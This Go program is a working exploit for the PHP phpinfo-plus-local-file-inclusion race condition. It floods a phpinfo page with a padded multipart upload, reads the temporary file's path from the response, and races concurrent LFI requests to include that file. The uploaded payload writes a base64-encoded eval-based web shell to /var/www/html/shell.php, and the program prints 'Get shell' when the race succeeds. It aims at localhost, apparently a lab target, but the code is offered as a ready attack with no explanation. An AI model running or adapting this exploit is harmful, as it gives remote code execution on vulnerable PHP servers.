package main

import (
	"bytes"
	"context"
	"fmt"
	"net"
	"strings"
)

var ctx, cancel = context.WithCancel(context.Background())
var payload = `SECURUTY <?php file_put_contents("/var/www/html/shell.php",base64_decode("PD9waHAgZXZhbCgkX1JFUVVFU1RbJ2NvZGUnXSk7Pz4="));?>`
var post_body string = fmt.Sprintf(`-----------------------------7dbff1ded0714
Content-Disposition: form-data; name="dummyname"; filename="test.txt"
Content-Type: text/plain

%s
-----------------------------7dbff1ded0714--`, payload)
var post_body_1 = strings.ReplaceAll(post_body, "\n", "\r\n")

var padding = strings.Repeat("x", 5000)
var http_post = strings.ReplaceAll(fmt.Sprintf(`POST /?a=%s HTTP/1.1
Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=%s
Accept: %s
User-Agent: %s
Accept-Language: %s
Pragma: %s
Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714
Content-Length: %d
Host: 127.0.0.1:16789

%s`, padding, padding, padding, padding, padding, padding, len(post_body_1), post_body), "\n", "\r\n")

var tcp_payloads = map[string]string{
	"phpinfo": http_post,
	"lfi": strings.ReplaceAll(`GET /index.php?file=%s HTTP/1.1
Host: 127.0.0.1:16789
User-Agent: curl/7.68.0
Accept: */*

`, "\n", "\r\n"),
}

func get_tmpfile_offset() int {
	conn, _ := net.Dial("tcp", "127.0.0.1:16789")
	defer conn.Close()
	payload := tcp_payloads["phpinfo"]
	conn.Write([]byte(payload))
	var resp [0xffffff]byte
	var l = 0
	var n int
	for {
		n, _ = conn.Read(resp[l:])
		if n == 0 {
			break
		} else {
			l += n
		}
	}
	r := bytes.Index(resp[:], []byte("[tmp_name] =&gt;"))
	r += len("/tmp/phpbKZj97") + 3
	println("[+] offset : ", r)
	return r
}

func phpinfo_lfi(tmpfile_offset int, i int) {
	for {
		var resp [0xffffff]byte
		conn_phpinfo, _ := net.Dial("tcp", "127.0.0.1:16789")
		conn_lfi, _ := net.Dial("tcp", "127.0.0.1:16789")
		payload := tcp_payloads["phpinfo"]
		conn_phpinfo.Write([]byte(payload))
		var l = 0
		var n int
		for l < tmpfile_offset {
			n, _ = conn_phpinfo.Read(resp[l : l+0x1000])
			if n != 0 {
				l += n
			} else {
				break
			}

		}
		tmpfile_path := string(resp[tmpfile_offset : tmpfile_offset+len("/tmp/phpbKZj97")])
		// println("[+] complete  : ", tmpfile_path)
		payload = fmt.Sprintf(tcp_payloads["lfi"], tmpfile_path)
		conn_lfi.Write([]byte(payload))
		var resp_1 [0x1000]byte
		conn_lfi.Read(resp_1[0:])
		conn_lfi.Close()
		conn_phpinfo.Close()
		r := bytes.Index(resp_1[:], []byte("SECURUTY"))
		if r != -1 {
			println("[!] Get shell ~~~")
			cancel()
		}
	}
}
func main() {
	offset := get_tmpfile_offset()
	for i := 0; i < 10; i++ {
		go phpinfo_lfi(offset, i)
	}
	<-ctx.Done()
}
